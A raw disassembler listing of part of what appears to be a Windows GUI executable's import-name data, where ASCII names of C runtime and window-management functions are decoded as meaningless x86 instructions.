  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
